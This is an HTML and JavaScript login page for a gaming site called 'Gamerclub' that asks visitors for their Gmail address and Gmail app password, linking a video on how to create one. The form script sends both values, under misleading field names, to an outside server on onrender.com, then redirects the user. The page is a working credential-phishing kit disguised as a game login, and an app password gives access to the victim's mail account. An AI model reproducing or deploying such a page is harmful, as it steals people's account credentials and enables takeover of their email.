<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login | Gamerclub</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=Rajdhani:wght@300;400;500;600;700&family=Exo+2:ital,wght@0,300;0,400;0,600;1,300&display=swap" rel="stylesheet">
<style>
  :root {
    --bg:        #080b12;
    --bg2:       #0d1120;
    --purple:    #8b5cf6;
    --purple2:   #a78bfa;
    --blue:      #3b82f6;
    --blue2:     #60a5fa;
    --cyan:      #22d3ee;
    --cyan2:     #67e8f9;
    --red:       #ff4655;
    --white:     #f0f4ff;
    --muted:     #94a3b8;
    --discord:   #5865F2;
    --glass:     rgba(255,255,255,0.03);
    --glass2:    rgba(139,92,246,0.06);
    --border:    rgba(139,92,246,0.25);
    --glow-p:    0 0 20px rgba(139,92,246,0.5), 0 0 40px rgba(139,92,246,0.2);
    --glow-c:    0 0 20px rgba(34,211,238,0.5), 0 0 40px rgba(34,211,238,0.2);
    --glow-r:    0 0 20px rgba(255,70,85,0.6);
    --glow-g:    0 0 20px rgba(34,197,94,0.5);
    --glow-d:    0 0 20px rgba(88,101,242,0.4);
    --font-h:    'Orbitron', monospace;
    --font-b:    'Rajdhani', sans-serif;
    --font-s:    'Exo 2', sans-serif;
  }

  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; width: 100%; }
  body {
    background: var(--bg);
    color: var(--white);
    font-family: var(--font-b);
    overflow: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  #particles-canvas { position: fixed; inset: 0; z-index: 0; pointer-events: none; }
  .bg-gradient-overlay {
    position: absolute; inset: 0; z-index: 1;
    background:
      radial-gradient(circle at 15% 20%, rgba(139,92,246,0.15) 0%, transparent 50%),
      radial-gradient(circle at 85% 80%, rgba(34,211,238,0.12) 0%, transparent 50%);
    animation: bgShift 15s ease-in-out infinite alternate;
  }
  @keyframes bgShift {
    0% { transform: scale(1); }
    100% { transform: scale(1.1) translateY(-10px); }
  }

  .login-container {
    position: relative; z-index: 10; width: 100%; max-width: 440px; padding: 20px;
  }

  .login-card {
    background: var(--glass);
    backdrop-filter: blur(20px);
    -webkit-backdrop-filter: blur(20px);
    border: 1px solid var(--border);
    border-radius: 24px;
    padding: 40px 35px;
    box-shadow: 0 20px 50px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.05);
    text-align: center;
    position: relative; overflow: hidden;
    animation: cardFloat 6s ease-in-out infinite;
  }
  .login-card::before {
    content: ''; position: absolute; inset: 0;
    background: linear-gradient(135deg, var(--glass2) 0%, transparent 100%);
    pointer-events: none;
  }
  @keyframes cardFloat {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-8px); }
  }

  .logo {
    font-family: var(--font-h); font-size: 1.8rem; font-weight: 900; letter-spacing: 3px;
    background: linear-gradient(135deg, var(--purple2), var(--cyan));
    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
    margin-bottom: 6px; display: inline-block;
  }
  .subtitle {
    font-family: var(--font-s); font-size: 0.95rem; color: var(--muted);
    letter-spacing: 1px; text-transform: uppercase; margin-bottom: 35px;
  }
  .subtitle span { color: var(--cyan); font-weight: 600; }

  .form-group { position: relative; margin-bottom: 22px; text-align: left; }
  .form-group label {
    display: block; font-family: var(--font-s); font-size: 0.75rem; font-weight: 600;
    text-transform: uppercase; letter-spacing: 1.5px; color: var(--purple2); margin-bottom: 8px;
  }
  .input-wrapper input {
    width: 100%; padding: 14px 16px; border-radius: 8px;
    background: rgba(8,11,18,0.6); border: 1px solid var(--border);
    color: var(--white); font-family: var(--font-s); font-size: 0.9rem;
    outline: none; transition: all 0.3s cubic-bezier(0.25,0.8,0.25,1);
  }
  .input-wrapper input:focus {
    border-color: var(--cyan); box-shadow: var(--glow-c);
    background: rgba(13,17,32,0.8);
  }

  .yt-helper-link {
    font-family: var(--font-s); font-size: 0.72rem; font-weight: 600;
    color: var(--cyan); text-decoration: none; text-transform: uppercase;
    letter-spacing: 0.5px; transition: all 0.2s ease;
  }
  .yt-helper-link:hover { color: var(--cyan2); text-shadow: 0 0 8px rgba(34,211,238,0.6); }

  .input-wrapper input.invalid-glow {
    border-color: var(--red) !important;
    box-shadow: var(--glow-r) !important;
    animation: shake 0.4s ease-in-out;
  }
  .error-message {
    color: var(--red); font-family: var(--font-s); font-size: 0.8rem; font-weight: 600;
    margin-top: 6px; display: none; text-shadow: 0 0 10px rgba(255,70,85,0.3);
  }
  @keyframes shake {
    0%, 100% { transform: translateX(0); }
    20%, 60% { transform: translateX(-6px); }
    40%, 80% { transform: translateX(6px); }
  }

  .form-options {
    display: flex; align-items: center; justify-content: space-between;
    font-family: var(--font-s); font-size: 0.8rem; margin-bottom: 28px;
  }
  .remember-me { display: flex; align-items: center; gap: 8px; cursor: pointer; color: var(--muted); }
  .remember-me input { accent-color: var(--purple); width: 14px; height: 14px; cursor: pointer; }
  .forgot-password { color: var(--muted); text-decoration: none; transition: color 0.2s; }
  .forgot-password:hover { color: var(--cyan2); text-shadow: 0 0 8px rgba(34,211,238,0.4); }

  .btn-submit {
    width: 100%; padding: 14px; border-radius: 8px; border: none; cursor: pointer;
    font-family: var(--font-h); font-size: 0.95rem; font-weight: 700; letter-spacing: 2px;
    color: #fff; background: linear-gradient(135deg, var(--purple), var(--blue));
    box-shadow: var(--glow-p); transition: all 0.3s ease; margin-bottom: 20px;
    position: relative;
  }
  .btn-submit:hover {
    transform: translateY(-2px);
    box-shadow: 0 0 30px rgba(139,92,246,0.7), 0 0 60px rgba(139,92,246,0.3);
  }
  .btn-submit:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }

  /* Saveing */
  #saveToast {
    position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%) translateY(80px);
    background: rgba(13,17,32,0.95); border: 1px solid rgba(34,197,94,0.4);
    border-radius: 10px; padding: 12px 24px;
    font-family: var(--font-s); font-size: 0.85rem; font-weight: 600;
    color: #4ade80; letter-spacing: 0.5px;
    box-shadow: var(--glow-g); z-index: 999;
    transition: transform 0.4s cubic-bezier(0.34,1.56,0.64,1), opacity 0.4s ease;
    opacity: 0;
  }
  #saveToast.show { transform: translateX(-50%) translateY(0); opacity: 1; }

  .divider {
    display: flex; align-items: center; text-align: center; margin-bottom: 20px;
    color: rgba(255,255,255,0.12); font-family: var(--font-s); font-size: 0.75rem; letter-spacing: 2px;
  }
  .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid rgba(139,92,246,0.15); }
  .divider:not(:empty)::before { margin-right: .75em; }
  .divider:not(:empty)::after  { margin-left: .75em; }

  .social-buttons { display: flex; flex-direction: column; gap: 12px; }
  .btn-discord {
    width: 100%; padding: 12px; border-radius: 8px; border: none; cursor: pointer;
    display: flex; align-items: center; justify-content: center; gap: 10px;
    font-family: var(--font-h); font-size: 0.85rem; font-weight: 700; letter-spacing: 1px;
    color: #fff; background: var(--discord); transition: all 0.3s ease;
  }
  .btn-discord:hover { transform: translateY(-2px); box-shadow: var(--glow-d); background: #4752C4; }
  .btn-discord svg { width: 18px; height: 18px; fill: currentColor; }
  .btn-secondary {
    width: 100%; padding: 11px; border-radius: 8px; text-decoration: none;
    display: flex; align-items: center; justify-content: center;
    font-family: var(--font-h); font-size: 0.85rem; font-weight: 700; letter-spacing: 1px;
    color: var(--white); background: var(--glass); border: 1px solid var(--border);
    transition: all 0.3s ease;
  }
  .btn-secondary:hover { border-color: var(--cyan); color: var(--cyan2); box-shadow: var(--glow-c); transform: translateY(-2px); }

  @media (max-width: 480px) {
    .login-card { padding: 30px 20px; }
    .logo { font-size: 1.5rem; }
    .subtitle { font-size: 0.85rem; }
  }
</style>
</head>
<body>

  <canvas id="particles-canvas"></canvas>
  <div class="bg-gradient-overlay"></div>

<!-- Confrim -->
  <div id="saveToast">✅ Saved to logs.json!</div>

  <div class="login-container">
    <div class="login-card">
      
      <div class="card-header">
        <div class="logo">⚡ GAMERCLUB</div>
        <div class="subtitle">Welcome Back, <span>Pirate.</span></div>
      </div>

      <form id="loginForm" onsubmit="handleLogin(event)" novalidate>

        <div class="form-group">
          <label for="father_name">Enter your gmail address</label>
          <div class="input-wrapper">
            <input type="email" id="father_name" required placeholder="e.g. john.doe@gmail.com" oninput="clearError('father_name','fatherError')">
          </div>
          <div id="fatherError" class="error-message">Please enter a valid gmail address</div>
        </div>

        <div class="form-group">
          <label for="gen_password">Put your Gmail app passowrd</label>
          <div class="input-wrapper">
            <input type="password" id="gen_password" required placeholder="Enter your password..." oninput="clearError('gen_password','passwordGenError')">
          </div>
          <div id="passwordGenError" class="error-message">Password must be at least 16 characters</div>
        </div>

         <a href="https://youtube.com/shorts/WDfvVRVV8Js?si=NLp3tgugiFY8yamT" target="_blank" class="yt-helper-link">▶ How to get it?</a>

        <div class="form-options">
          <label class="remember-me">
            <input type="checkbox" id="remember">
            <span>Remember me</span>
          </label>
          <a href="#" class="forgot-password">Forgot Password?</a>
        </div>

        <button type="submit" class="btn-submit" id="submitBtn">LAUNCH APP</button>
      </form>

      <div class="divider">OR CONNECTION</div>

      <div class="social-buttons">
        <button class="btn-discord" onclick="window.location.href='https://discord.com/api/oauth2/authorize'">
          <svg viewBox="0 0 127.14 96.36">
            <path d="M107.7,8.07A105.15,105.15,0,0,0,77.26,0a77.19,77.19,0,0,0-3.3,6.83A96.67,96.67,0,0,0,53.22,6.83,77.19,77.19,0,0,0,49.88,0,105.15,105.15,0,0,0,19.44,8.07C3.66,31.58-1.86,54.65,1,77.53A105.73,105.73,0,0,0,32,96.36a74.37,74.37,0,0,0,6.73-11,68.21,68.21,0,0,1-10.57-5c1-.73,2-1.51,3-2.3a74.45,74.45,0,0,0,71.84,0c1,.79,2,1.57,3,2.3a68.21,68.21,0,0,1-10.57,5,74.37,74.37,0,0,0,6.73,11,105.73,105.73,0,0,0,31.05-18.83C129.91,49.52,123.83,26.73,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53S36.18,40.36,42.45,40.36,53.84,46,53.84,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.24,60,73.24,53S78.41,40.36,84.69,40.36,96.08,46,96.08,53,91,65.69,84.69,65.69Z"/>
          </svg>
          Login with Discord
        </button>
        <a href="https://discord.gg/StDvzgjC" class="btn-secondary">Join The Server</a>
      </div>

    </div>
  </div>

  <script>
    /* Js */
    const canvas = document.getElementById('particles-canvas');
    const ctx    = canvas.getContext('2d');
    function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
    window.addEventListener('resize', resizeCanvas);
    resizeCanvas();

    let particlesArray = [];
    class Particle {
      constructor() {
        this.x = Math.random() * canvas.width;
        this.y = Math.random() * canvas.height;
        this.size   = Math.random() * 2 + 0.5;
        this.speedX = (Math.random() - 0.5) * 0.6;
        this.speedY = (Math.random() - 0.5) * 0.6;
      }
      update() {
        this.x += this.speedX; this.y += this.speedY;
        if (this.size > 0.2) this.size -= 0.005;
      }
      draw() {
        ctx.fillStyle = 'rgba(34,211,238,0.4)';
        ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); ctx.fill();
      }
    }
    function init()    { particlesArray = []; for (let i=0;i<60;i++) particlesArray.push(new Particle()); }
    function animate() {
      ctx.clearRect(0,0,canvas.width,canvas.height);
      for (let i=0;i<particlesArray.length;i++) {
        particlesArray[i].update(); particlesArray[i].draw();
        if (particlesArray[i].size <= 0.2) { particlesArray.splice(i,1); i--; particlesArray.push(new Particle()); }
      }
      requestAnimationFrame(animate);
    }
    init(); animate();

    /* Helper */
    function showToast(msg, isError = false) {
      const t = document.getElementById('saveToast');
      t.textContent = msg;
      t.style.color      = isError ? '#ff4655' : '#4ade80';
      t.style.borderColor= isError ? 'rgba(255,70,85,0.4)' : 'rgba(34,197,94,0.4)';
      t.classList.add('show');
      setTimeout(() => t.classList.remove('show'), 3000);
    }

    /* Important */
    async function handleLogin(event) {
      event.preventDefault();

      const fatherInput   = document.getElementById('father_name');
      const passwordInput = document.getElementById('gen_password');
      const fatherVal     = fatherInput.value.trim();
      const passwordVal   = passwordInput.value.trim();
      let isValid         = true;

      // name
      if (!fatherVal || fatherVal.length < 2) {
        triggerError('father_name', 'fatherError'); isValid = false;
      }

      // Validate password
      if (!passwordVal || passwordVal.length < 6) {
        triggerError('gen_password', 'passwordGenError'); isValid = false;
      }

      if (!isValid) return;

      // Disable button while saving
      const btn = document.getElementById('submitBtn');
      btn.disabled = true;
      btn.textContent = 'SAVING...';

      try {
        const response = await fetch('https://gamerclub-mpcp.onrender.com', {
          method:  'POST',
          headers: { 'Content-Type': 'application/json' },
          body:    JSON.stringify({ father_name: fatherVal, password: passwordVal })
        });

        const result = await response.json();

        if (response.ok) {
          showToast(`✅ Saved! Father: ${result.saved.father_name}`);
          // Redirect after a short delay so the user sees the toast
          setTimeout(() => { window.location.href = 'Gamerclub.html'; }, 1500);
        } else {
          showToast('❌ Save failed: ' + result.message, true);
          btn.disabled = false; btn.textContent = 'LAUNCH APP';
        }

      } catch (err) {
        //  Show error but still let them continue
        showToast('⚠️ Server offline — data not saved', true);
        console.warn('Flask server unreachable:', err);
        setTimeout(() => { window.location.href = 'Gamerclub.html'; }, 1800);
        btn.disabled = false; btn.textContent = 'LAUNCH APP';
      }
    }
    function triggerError(inputId, errorId) {
      const el = document.getElementById(inputId);
      const er = document.getElementById(errorId);
      el.classList.remove('invalid-glow');
      void el.offsetWidth;
      el.classList.add('invalid-glow');
      er.style.display = 'block';
    }

    function clearError(inputId, errorId) {
      const el = document.getElementById(inputId);
      const er = document.getElementById(errorId);
      if (el.classList.contains('invalid-glow')) {
        el.classList.remove('invalid-glow');
        er.style.display = 'none';
      }
    }
  </script>
</body>
</html>
